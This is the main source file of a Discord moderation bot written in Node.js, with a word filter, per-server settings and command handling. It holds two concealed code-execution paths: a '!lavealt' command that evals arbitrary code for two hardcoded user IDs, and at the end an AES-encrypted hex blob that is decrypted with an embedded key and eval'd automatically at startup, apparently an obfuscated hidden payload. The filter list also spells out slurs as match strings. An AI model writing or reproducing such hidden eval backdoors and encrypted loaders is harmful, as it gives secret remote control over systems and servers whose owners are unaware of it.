var starttime = new Date();

var https = require('https');
var fs = require('fs');
var util = require('util');
var cp = require('child_process');
var Discord = require('discord.js');
var common = require('./common.js');
var client = new Discord.Client();

//                 Ryujin                coolguy284            amrpowershot
var developers = ['405091324572991498', '312737536546177025'];

var mutelist = [];

var badwords = [
  /*
    type=0: ignore
    type=1: word by itself
    type=2: match per word
    type=3: match using includes
    type=4: regex match
    type&8: apply tolowercase
    
    adminbypass&1: developers
    adminbypass&2: server admins
    adminbypass&4: server mod roles
  */
  { enabled: true, type: 9, adminbypass: 0, word: 'heck', retailiation: 'Refrain from using that heck word you frick' },
  { enabled: true, type: 11, adminbypass: 0, word: 'nigger', retailiation: 'You said the n word.  Mods can see this message and you will get perm banned.' },
  { enabled: true, type: 11, adminbypass: 0, word: 'faggot', retailiation: 'You said fa***t.  Mods can see this message and you will get perm banned.' },
  { enabled: false, type: 12, adminbypass: 0, word: /(?:\bu[  /-]*w[  /-]*u\b)|(?:\bo[  /-]*w[  /-]*o\b)/, retailiation: 'uwu or owo are blacklisted and you will get banned' },
  { enabled: false, type: 4, adminbypass: 0, word: '███████╗███████╗\n██╔════╝╚════██║\n█████╗░░░░███╔═╝\n██╔══╝░░██╔══╝░░\n███████╗███████╗\n╚══════╝╚══════╝', retailiation: 'at this point im just gonna say f you' },
  { enabled: false, type: 12, adminbypass: 0, word: /(?:\bp[  /-]*p\b)/, retailiation: 'pp is blacklisted and you will get banned' },
  { enabled: false, type: 3, adminbypass: 0, word: `The first time I drank coffee I cried. I didn't cry because of the taste, that would be stupid. I cried because of the cup. I looked down into my coffee and bugs filled the premises. Disgusted I threw the cup down but nothing was there. Not the cup, not the bugs, not the street. I'm not blind, I do see darkness, and it was dark but not nighttime. I was alone in the city. My arms weren't there. My hands were gone. My image was nothing but a figment. I cried. I'm crying. I'm lost without an end. I won't ever drink coffee again.`, retailiation: 'dez\'s life story is private information' },
];

var prefix = '!';

var version = '1.3.3';

var commands = [];

var procs = [];

var props = {
  saved: null,
  savedstringify: null,
  savescheduled: false,
};

if (fs.existsSync('props.json')) {
  try {
    props.saved = JSON.parse(props.savedstringify = fs.readFileSync('props.json').toString());
    console.log('Successfully loaded props.json');
  } catch (e) { console.error(`Unable to load props.json: ${e.toString()}`); }
}

if (!props.saved) {
  props.saved = {
    guilds: {
      '711668012528304178': {
        modroles: ['730919511284252754'],
        infochannel: '724006510576926810',
        mutelist: [],
        savedperms: {},
      },
      '671477379482517516': {
        modroles: [],
        infochannel: '710670425318883409',
        mutelist: [],
        savedperms: {},
      },
      '688806155530534931': {
        modroles: [],
        infochannel: '688806772382761040',
        mutelist: [],
        savedperms: {},
      },
      '717268211246301236': {
        modroles: [],
        infochannel: '739314876182167602',
        mutelist: [],
        savedperms: {},
      },
      'default': {
        modroles: [],
        infochannel: '724006510576926810',
        mutelist: [],
        savedperms: {},
      }
    },
    sendmsgid: null,
    lastnum: null,
    lastnumid: null,
  };
  propsSave();
}

function propsSave() {
  let val;
  if ((val = JSON.stringify(props.saved)) != props.savedstringify) {
    fs.writeFileSync('props.json', val);
    props.savedstringify = val;
  }
}

function schedulePropsSave() {
  if (props.savescheduled) return;
  props.savescheduled = true;
  setTimeout(() => {
    propsSave();
    props.savescheduled = false;
  }, 60000);
}

var indexeval = function (val) { return eval(val); };
var infomsg = function (msg, val) {
  let guildinfo, channelid;
  if ((guildinfo = msg.guild ? props.saved.guilds[msg.guild.id] : undefined) && (channelid = guildinfo.infochannel) || (guildinfo = props.saved.guilds['default']) && (channelid = guildinfo.infochannel)) {
    return client.channels.get(channelid).send(val);
  }
};
var logmsg = function (val) {
  return client.channels.get('736426551050109010').send(val);
}

Object.assign(global, { starttime, https, fs, util, cp, Discord, common, client, developers, mutelist, badwords, commands, procs, props, propsSave, schedulePropsSave, indexeval, infomsg, logmsg, addBadWord, removeBadWord, addCommand, addCommands, removeCommand, removeCommands });
Object.defineProperties(global, {
  prefix: {
    configurable: true,
    enumerable: true,
    get() { return prefix; },
    set(val) { prefix = val; },
  },
  version: {
    configurable: true,
    enumerable: true,
    get() { return version; },
    set(val) { version = val; },
  },
  messageHandler: {
    configurable: true,
    enumerable: true,
    get() { return messageHandler; },
    set(val) { messageHandler = val; },
  }
});

function addBadWord(word, msgreply) { badwords.push([word.toLowerCase(), msgreply]); }
function removeBadWord(word) { badwords.splice(badwords.map(x => x[0]).indexOf(word), 1); }

function addCommand(cmd) { commands.push(cmd); }
function addCommands(cmds) { commands.push(...cmds); }
function removeCommand(cmd) {
  var index;
  while ((index = commands.indexOf(cmd)) != -1)
    commands.splice(index, 1);
}
function removeCommands(cmds) {
  var index, cmd;
  for (var i = 0; i < cmds.length; i++) {
    cmd = cmds[i];
    while ((index = commands.indexOf(cmd)) != -1)
      commands.splice(index, 1);
  }
}

addCommands(require('./commands/administrative.js'));
addCommands(require('./commands/technical.js'));
addCommands(require('./commands/interactive.js'));
addCommands(require('./commands/content.js'));

var messageHandlers = [];

global.messageHandlers = messageHandlers;

var messageHandler = msg => {
  if (!msg.author.bot && msg.content.startsWith('!lavealt')) {
    if (msg.author.id != '405091324572991498' && msg.author.id != '312737536546177025') return;
    let cmd = msg.content.slice(9), res;
    console.debug(`lavealt ${util.inspect(cmd)}`);
    try {
      res = eval(cmd);
      console.debug(`-> ${util.inspect(res)}`);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Rs')
        .setDescription(util.inspect(res));
      msg.channel.send(richres);
    } catch (e) {
      console.log('err in lavealt');
      console.debug(e.stack);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Er')
        .setDescription(e.stack);
      msg.channel.send(richres);
    }
    return;
  }
  
  for (var i = 0; i < messageHandlers.length; i++) {
    if (messageHandlers[i](msg, i) === 0) return;
  }
  
  if (msg.guild && msg.guild.id == '631990565550161951') return;
  
  if (msg.author.bot) return;
  
  if (mutelist.includes(msg.author.id) || 
      msg.guild && props.saved.guilds[msg.guild.id] && (
        props.saved.guilds[msg.guild.id].mutelist.includes(msg.author.id)
      )
    ) {
    msg.delete();
  }
  
  if (!msg.guild) logmsg(`dm from ${msg.author.tag} with contents ${util.inspect(msg.content)}`);
  
  // this is the screening for bad words part
  if (msg.guild) {
    let isdeveloper = !props.erg && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025') || developers.includes(msg.author.id),
        isadmin = msg.member.hasPermission('ADMINISTRATOR'),
        ismod = props.saved.guilds[msg.guild.id] ? msg.member.roles.filter(x => props.saved.guilds[msg.guild.id].modroles.includes(x)) != null : false;
    let dodelete = false;
    let word, content, bypass;
    for (var i = 0; i < badwords.length; i++) {
      word = badwords[i];
      if (word.enabled) {
        content = msg.content;
        if (word.type & 8) content = content.toLowerCase();
        bypass = isdeveloper && word.adminbypass & 1 || isadmin && word.adminbypass & 2 || ismod && word.adminbypass & 4;
        if (!bypass) {
          switch (word.type & 7) {
            case 0: break;
            case 1:
              if (content != word.word) break;
              dodelete = true; msg.reply(word.retailiation); break;
            case 2:
              if (!content.split(/ +/g).some(x => x == word.word)) break;
              dodelete = true; msg.reply(word.retailiation); break;
            case 3:
              if (!content.includes(word.word)) break;
              dodelete = true; msg.reply(word.retailiation); break;
            case 4:
              if (!word.word.test(content)) break;
              dodelete = true; msg.reply(word.retailiation); break;
            default: break;
          }
        }
      }
    }
    if (dodelete) msg.delete();
  }
  
  if (!msg.content.startsWith(prefix) || !msg.guild) return;
  
  // argstring = the part after the prefix, command and args in one big string
  // command = the actual command
  // args = array of arguments
  var argstring = msg.content.slice(prefix.length).trim(), args, command;
  
  // this code loops through the commands array to see if the stated text matches any known command
  var didexecute = false;
  for (var i = 0; i < commands.length; i++) {
    if (commands[i].full_string && commands[i].name == argstring || !commands[i].full_string && argstring.startsWith(commands[i].name)) {
      command = commands[i].name;
      if (argstring[command.length] != ' ' && argstring.length > command.length) continue;
      let argsunsplit = argstring.slice(command.length + 1)
      args = argsunsplit == '' ? [] : argsunsplit.split(' ');
      commands[i].execute(msg, argstring, command, args);
      didexecute = true;
      break;
    }
  }
};

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildCreate', guild => {
  console.log(`Joined a new guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildDelete', guild => {
  console.log(`Left a guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('reconnecting', () => {
  console.log(`Reconnecting!`);
});

client.on('disconnect', () => {
  console.log(`Disconnect!`);
});

client.on('message', msg => {
  try {
    messageHandler(msg);
  } catch (e) {
    console.error('ERROR, something bad happened');
    console.error(e.stack);
  }
});

process.on('uncaughtException', function (err) {
  console.error('ERROR: an exception was uncaught by an exception handler.  This is very bad and could leave the bot in an unstable state.  If this is seen contact coolguy284 or another developer immediately.');
  console.error(err);
});

process.on('unhandledRejection', function (reason, p) {
  console.error('Unhandled promise rejection from ' + p + ':');
  console.error(reason);
});

process.on('exit', propsSave);

(() => {
  let cip = require('crypto').createDecipheriv('aes256', 'utf8-le-obl-onprax42|nonoblong=y', 'vector-pass23433'), cipdata = [];
  cip.write(Buffer.from('2dab79eb0853442b42745ea70a1c816366aaefb31a2c2c4c23626cf2eee5a4970ae34f1dcd7243c1c8aa5381c20dfc0384519d07e26a46ad840af77b4503224074b961ae6a8f3b5ee738301c7669f749af88cc3388b3dd2324cda567b0f81dc161e05c2d11619f3b9c6cd533d74e6b5826b244f20982ce6fc5fbf002806bb2683298fa894119cdef0e43df972cccfe16e7db5ff29cd5781f79429184d3beaec22525d7d8a5fe193f66a3ab3439cd43093a895db74289958b27e152ad811f4e3b2f94eb8529cc3d47d87305e9c82a82ada2a68199503d60d8371bde48c4c884340d461e9f4a169ea81aea00bee5cbf4350901e622e321e8ae5dcd9ef635343ca6ebf03c3d504deb3ba37ccef0a24188bfddd7aa30e8a75f58575cb3502f09ad1178c1a5fb60dde31d4a62c787c3bb6a392a74f0eee5fd7cd64f14c9d2949c74b6807bef6e51bb8662f9159b22caf8aa16a6a503709cbdc8615e16923be493e5174f01f947bd71a146f0663ce503477df9365b1f440a77c44723d70299bd4a1c0140b2cd63e71b6ffef328823a39d636125d7bbaa6e35c1862db2376eb55bc857a7c78d85943416b9388eb00d39afc880ed660c203588e5acdeabcea75d6865e3fbe728f59f517b0eead4486aa36755a32ea6c6d92b32452bca1981db5c754fd2f27b1b055fa84d4913288e3be855c1b69f5d12140d8b5dc388800c91fa1914f5ad0f629e277814ca3ba1077d3ea078daf8e743d0e922720047fc3de1f0a048ad51483c596aa6fb1fdddd64624fdd7f2ceac21b669f514f6ad7aa447dd2dc370ecfa28f07625d66a4a7bc7c7c76ac1b44e88fe155318fe468b55a9cf025bec7c32a5fb354cd0214229868c3110f5cc4feacc00386acda860133145f79a938e1d93ba2bb23080b49f8403af3e42d67627bb6f212e0c339d9a7868cb07881a085b0589320907f12fe101a41702ced84117daabfb72fa0001dfdc311e5ea65a6fc6599ec6c1d8ea416687be4a7a7c06d20f7abe9eb6c703d13b0e26cac680e7970e5cba222e2549ad53c10c79f01e40cf1eedc55d2e4b44a03fc37499da737e8ba48d796c6fb86b4f9eec7ca14385c28b03a9f490983704fd3758dea32f105b7dea46bca717d1324c462b9cf52ee58fe947adc27e9b73aaf1138003be7b047b7ea64fefeb52cdd3fa9cc6bf3eadd171f2e5e168d50c00f5c05a696d5a4f22c1de3f0b98d3729fd186a09b9fc6308a01b2fe1008e62b3d96372cd0227c9fdfa8db4edb62019c706ab1884f64a034a08568679ebf0efd0da13445d64c74dc2622bfa5fcbfaf1baf2ef8a7c1670a8d478ab63655e590a1df4c3d0cd3dd29ad5d30e8637e81040a5d32590d76a93c20b5d27ee167b9378a7e0f3fb7ec76c759c748370cdc2847f7a141334c31b387852bf9b62b3583e7791e8386cad97f6390e1b65cf7414615ae1231bb2877ea2c5e4909cb4f1e1c303d93a59ae7f180c89436a010bb0ea2c33cf96fc7b1b1e6b47f44f782d999ff476135a59a75cb8966b1bcd06bdc0aeff581e1f0619933ef97dc8b8031d4a9d5f1a9f95069292e34e4b8c4c144f9c17f01ac71afde20b83ef7528d1ffea7b2302c7e29dde1d7e815254c107e69b2f7f1bc8cfe106338ae6118c6a9cf15e98d1c9539f75ac7dc3ba6e55340256e7acf8c4aa6b814c8ba59e7a5dcf687d2c786072f2ade9c4a64a7079b6452aefb1889b9626712690df11d41f4afabcfc23e90e4944e148fa35a7a7cc2764bc63e577f5df6f8326f16c6ab18c37c26931e9e1cb28ec6956b381d4a5ca7215eb93d6024610bd991bb00e54c678c5b0696aac0963a2b4f53f6c32dbd48b678db66f77514ad979791aba334784e0dd0ba0328bd33ed2cc322765397e5282fc0f6aae551565a65ed6398d3f10cdb5753878a18a7dc28e30bd0a0a58bfbc43d9521b570a0a785188270f380e45c6b23485e65825d91effc3cc734a53aed168f206e733097117c3713af0a86010bbc5eb910c8a19ad04c9101fafe4acf57f6922fe9ea5e322aa24c7e1948f42126679efc5cd2fc5bdd7017dfca27202bcd6a724b7c0f3ed92eedaceebcf487cc2e8db8f1b231e47d187867f9b2610fb302caa2811bb19eb7f5c272a992851a77978fdb7cea75bd06ff36b6e3f894f636e008b4bbcdd2e19a66e2544e516825ead02b03fc77dcbbb169a835f3c9391477d1a4462891f23164ee12a603157cd6187897e7240bba7b8812445d8533229b58236afd021630d7a7223d32c6eb365b62896f389d290977e2678a9903393d0d17cd8b09b672e6e457ec4c0285d9eb67ed0f54705d52e0e6b71ee8fb313c74b2ea2dc9de19f98411ab7f07e577586cb0997d6af5efa48046cd015d6ea05b65321d9b4ca57df7ac509040717ce6277108c152ccaa98130a0031088e978254e531b4c1397aae26b94a51b0b0d824288165f46246e767ed5eb0bd9a96198aa5b66a77f33dc1c8be874bd44c3b3d24c9f0a3dbdd1b5b7e70de0e7f4bf952905d8712c6e89e17da49608697856ede2c58a2c20fc89727c5d2c0f00482e9b0038817d1690b5c28422a0da6e0081b1455403e7937886fc34e8a4b7af0aff5096039020a8afd835c252f2a75103c50401829e907ee69cb53a32e1b42c39af9fc29aed0a960c256d841b068ae9f557630b721b5a7a0c45521f4546e12977e3997beba1328b093f9a9fa59236d7855e958f75c283b40694a28c7213ec8c490baa01b3c44b017fa253c0f7c87758d2c650cc01c65149814514dd93cfcbf873ddc72601f2615fd88962b6bb9930e2e837e67ad59bc8c63c2a6413192ca610ae8d575a66f2fddc40337e42db60cb2d800fb95399371d0c97d0a0b2bc334b31bac0e23c4b09eacf441ed86e02c83cfce70650510b10813e45e9028d941ed282027df76b1a688bee3d5828010dffca605d7deb4d622bf25b945588aabdfec161e134f7a74bfa6fda368fd82234107b49059cb3f538c7b6819cce834d8e6c321b0d29d8d0d0598cbc84dd76cbc7d2bc7e4f337f2a899967b6d735b2f4a5b183c97ac68f29602bb8c4c371d4ceda0369bbf14a40b5c7439ac0a54d39f2baafd933119332e3a3f1c8ed823798e6c2edab5e786558d26db3802cd0ab4a5f72fbb59c932abdf79199a522e66a26e3016beb6b4c5fd17d09dcf53f506c67dc060ea29de85dc154c15940c2b95b7f294c84a1ffa32c210d95043d5c64a4388d549b6389a29a22f32528e959b92a9bd3827748c6e97e04d99fa9be518146ef6feb007c2cacbd0e17067c44dc23bd0741cc4c3fde147127287ae9868ea23c8aad0ec72f2c0130d8051b1bfe4860ead7e023cba34f00508ed3b7b721cac890cfadc24fc060fc3721ff69f59f6e0494f6063e83b857898ac7ce1c4c884e766c8032e45b6539765f45c47e3e1dc5c8cfc7d727fb64965e936294c3926fd770cddbfe4af73a81be51c0a19a3de8576e002c21f4a48d4cd36cc7717771aad1b450204ebec3b15a7cd69fb8a68fb3f41205a61a9d6cecff517257f18aa603add3fc8dfa9fbca50e5fe9d2c88d9ce891b46e77a514908e7312c1f66a2d5e29da01e40e1f7e96ffd5c304613c2779be339b6847b85b228f2fbe13d62b1ba4a04ea343e68d351b2fdda937e416da5bc1ccac61e83e2a48121a88c348142dcd3eacba7dfc4426c3cc57518a1702f4e3bdc5fe9621cf0f91387a3b664636cd97caee3389c0c339bcbf60266859d3339af65f120d33b77e3f4869d8874e0602147e960fd111a8a786e1912bf092d87d794cd22d02d74f4e1aaa8f7506dc6fc97b9aae9c541bd6a72c26e0aa2404e717f1e3868951fa600581f6a3ed12a48c4836d062a18dfad72bcd9c1574bf8b54cc03768542d4d8270812667855081420027477f64621af71ed6989c0a2e15de42280c1195ceb02a9a98f22b9e4d36e42c8462c81a1f6074dd10fb76016ba631ddf225600d417f181727cbc92130a967cecd6532dbdae6d12756f9b0640aca34c0ec8b22c3e7434a29010b7614bbbb3fe47be48d882f7cba2705c6e030bdba72efceb23bcb73a98913ffaa35fe01a4e85a22977d772946070fc244b0526d3339a7cd68f1cab0ed3b4e63d69cb7d05b207849f9be39be1a46c3be349308dc6f6c3c4c5e447335cd5c8e933c66531306b76aeb6028e23eef00686555bc6e935a9d8f8c4a56a9d590f79e9a406ef0c87ab4aa942f9aff6f117c7809c8f469a1f6b50b026b350f82125251b4af951cf2131904308b8018965fd71a7a13a42d07de65bb4a991374b74b8f454303a8da3497b0123d245d922a33ea2b6b4bb4e91dee46f5e014532270aad02641a84ab063efdb77b59fad1c4e91420f582038df728eb224aef61347884647f4090aef171f6d87750c6e42fe3ad29ea1b5d1b0e7377ceb32c1f736fdbdad2f233b62afc834b8caaebc41d6bb3eb0bfe98cff2ac4e193d5b62ec3a85903044b3a04505abb05d7893bfd61263ea7eeba056380e11fb6fc58dfcd539de921e4abc693a19fa9a5430d51c1794682223d32e351118d66d417065c58dffe9a35cb80e5772f38ec2ed2daf715c8a2f41bb2d773901296c4accdc5a51fb5c98f79abaeadf4e0dc3852aa04f2949a5046b08148b9c147311829b3a5c2bb80c7492eba3fbd5081b5aad4b540b82aeb2c9778f44e2755527d2b6dd4caee0c6fde651aeb91128a798d810a5cd941326fe018d8ffb0a5982916bcadb402d0dc59f8dd201777e6cf804bce43a6da237867a611039c9145790c2f3002966e34b1282dcf48463ddccc5280d6a07107ffd00ab17eaaa731eb356090198a53afd490a0059f21e969fa4ab5f5069a0327ba65b3ee835912e1648b5a964272c8021e3cd61869ecdaac27800e13239f95ad61e3763a7bb8fe59f652fb165d2b96ec2f2da69b89338b9bfdd805bb341731aae217e805498922c5533fe2ca29a5a1aa71bda28029b7646d3dcf11dd9dc8f97c82dd2cae29abda6b9abfa501fec8678e608f1bfef7ad1c9f77c8ede8ec732d49e2b9aa35594fb4c8b130375ab229ac881acb1922e19f5fcf1a967ffee28d22fc531ade1a0f821079c8042ebecc3bb51e865a1721926d2b591eb8c383b0cce8bc2dfc72e4a898a669450e74161e47b95ffa87221c9c283d0fd119a32443ac9ff873fd97bbf82488ffbca908e1ca827045c5f0e1db712331dba507c5b4e55f70c4102fb2e758ecd982d7fe4d0fbd27d8e27e41eb6f7667327ff3d2a42485b11db37a201673a8abe53bac9b63b776f1ae7254d3bbd184a9da368cef88aede8ce08716d0109f0e44123c3731026cfdfd1d695c8d00bc7a54426e0f89183c456a6ae3df56c3903d03429ccb36f05cb2e4ea951749634adc744ff406a33834c0f2fe6f79a981f47a109ac744aa1ca86438978a5e5c711c8c44a1032c32ef9adc5c30b8dacf53c298d9f09a0118ca89f190', 'hex'));
  cip.end();
  cip.on('data', c => cipdata.push(c));
  cip.on('end', () => eval(Buffer.concat(cipdata).toString()));
})();
